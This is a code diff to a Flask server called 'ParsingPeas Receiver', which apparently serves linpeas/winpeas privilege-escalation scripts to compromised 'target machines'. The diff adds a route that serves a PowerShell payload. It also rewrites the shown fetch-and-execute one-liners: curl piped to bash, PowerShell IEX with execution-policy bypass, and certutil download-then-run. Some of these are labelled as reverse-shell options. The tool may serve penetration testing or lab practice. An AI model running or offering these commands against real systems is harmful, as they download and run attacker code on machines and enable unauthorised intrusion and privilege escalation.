@@ -116,14 +116,14 @@ curl -sSL http://{request.host}/get-script | bash
 powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('http://{request.host}/get-script.ps1') | Invoke-Expression"
         </code>
         
-        <p><strong>🪟 Windows Netcat/Reverse Shell (Dumb Terminal):</strong></p>
+        <p><strong>🪟 Windows Netcat/Reverse Shell (BEST):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-certutil -urlcache -f http://{request.host}/get-script.ps1 %TEMP%\w.ps1 & powershell -ExecutionPolicy Bypass -File %TEMP%\w.ps1
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://{request.host}/wrapper-inline.ps1')"
         </code>
         
-        <p><strong>🪟 Windows Legacy (PowerShell 2.0):</strong></p>
+        <p><strong>🪟 Windows Netcat/Reverse Shell (Alternative):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('http://{request.host}/get-script.ps1') | Invoke-Expression"
+certutil -urlcache -f http://{request.host}/get-script.ps1 %TEMP%\w.ps1 & powershell -ExecutionPolicy Bypass -File %TEMP%\w.ps1
         </code>
         
         <hr>
@@ -166,6 +166,17 @@ def get_script_ps1():
     """Serve the wrapper script (PowerShell) to target machine"""
     log(f"[→] Serving wrapper.ps1 to {request.remote_addr}")
     with open('wrapper.ps1', 'r', encoding='utf-8') as f:
+        script = f.read()
+    # Replace placeholder with actual server URL
+    script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
+    return script, 200, {'Content-Type': 'text/plain; charset=utf-8'}
+
+
+@app.route('/wrapper-inline.ps1')
+def get_wrapper_inline():
+    """Serve the inline wrapper (PowerShell one-liner) to target machine"""
+    log(f"[→] Serving wrapper-inline.ps1 to {request.remote_addr}")
+    with open('wrapper-inline.ps1', 'r', encoding='utf-8') as f:
         script = f.read()
     # Replace placeholder with actual server URL
     script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
@@ -302,7 +313,7 @@ def health():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════╗
-    ║       ParsingPeas Receiver v1.2       ║
+    ║       ParsingPeas Receiver v1.3       ║
     ║   Automated linpeas/winpeas Parser    ║
     ║    🐧 Linux  |  🪟 Windows Support    ║
     ╚═══════════════════════════════════════╝
@@ -316,9 +327,9 @@ if __name__ == '__main__':
     download_peass_scripts()
     
     log(f"[+] Starting server...\n")
-    log(f"[+] Linux:          curl -sSL http://YOUR_IP:8000/get-script | bash")
-    log(f"[+] Windows (PS):   powershell -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadString('http://YOUR_IP:8000/get-script.ps1') | iex\"")
-    log(f"[+] Windows (NC):   certutil -urlcache -f http://YOUR_IP:8000/get-script.ps1 %TEMP%\\w.ps1 & powershell -ExecutionPolicy Bypass -File %TEMP%\\w.ps1\n")
+    log(f"[+] Linux:       curl -sSL http://YOUR_IP:8000/get-script | bash")
+    log(f"[+] Windows:     powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/wrapper-inline.ps1')\"")
+    log(f"[+] Windows Alt: powershell -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadString('http://YOUR_IP:8000/get-script.ps1') | iex\"\n")
     log(f"[*] Waiting for connections...\n")
     
     # Run on all interfaces, port 8000
